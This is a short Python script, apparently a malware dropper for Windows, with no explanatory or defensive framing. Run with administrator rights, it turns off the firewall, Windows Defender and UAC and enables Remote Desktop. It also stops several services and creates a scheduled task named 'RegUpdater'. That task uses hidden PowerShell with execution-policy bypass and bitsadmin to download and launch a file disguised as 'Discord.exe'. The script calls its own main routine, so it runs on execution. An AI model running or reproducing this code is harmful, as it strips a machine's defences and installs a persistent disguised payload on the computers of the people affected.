import ctypes, os

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def stop():
	os.system("netsh advfirewall set currentprofile state off")
	os.system("REG add 'HKLM\\SYSTEM\\CurrentControlSet\\services\\WinDefend' /v Start /t REG_DWORD /d 4 /f")
	os.system("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f")
	os.system('reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
	os.system("reg add 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t reg_dword /d 0 /f")
	os.system("net stop WinDefend")
	os.system("net stop QBCFMonitorService")
	os.system("net stop IISADMIN")
	os.system("net stop mr2kserv")

def scheduletask():
	os.system('schtasks /create /tn RegUpdater /tr "c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "bitsadmin /transfer mydownloadjob /download /priority normal http://localhost/Discord.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\Discord.exe && C:\\Users\\%USERNAME%\\AppData\\local\\temp\\Discord.exe" /ST 14:00')

def execute():
	if isAdmin():
		stop()
		scheduletask()
		print("done")
	else:
		print("fail")

execute()